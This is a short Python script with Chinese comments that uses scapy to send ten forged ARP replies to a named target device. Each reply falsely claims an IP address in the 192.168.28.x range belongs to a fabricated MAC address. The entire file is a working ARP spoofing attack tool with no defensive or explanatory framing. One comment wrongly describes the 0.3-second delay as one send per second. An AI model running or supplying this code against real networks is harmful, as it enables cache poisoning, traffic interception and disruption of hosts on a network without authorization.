from scapy.all import ARP, send
import time

# 目標設備
target_ip = "192.168.28.172"
target_mac = "00:50:56:AE:8E:0B"

# IP/MAC 起始值
spoof_ip_base = "192.168.28."
spoof_ip_start = 191  # 從 .191 開始
mac_prefix = "12:34:56:78:9a"
mac_suffix_start = 0xbc  # 188 (十六進位 bc)

# 發送次數
for i in range(10):
    # 計算遞增的 IP 和 MAC 尾數
    current_ip = f"{spoof_ip_base}{(spoof_ip_start + i) % 256}"
    current_mac_suffix = (mac_suffix_start + i) % 256
    fake_mac = f"{mac_prefix}:{current_mac_suffix:02x}"

    # 構造 ARP 回應封包
    arp_response = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=current_ip,
        hwsrc=fake_mac
    )

    print(f"[{i+1}] Sending ARP spoof: {current_ip} is at {fake_mac}")
    send(arp_response, verbose=True)
    time.sleep(0.3)  # 每秒發一次
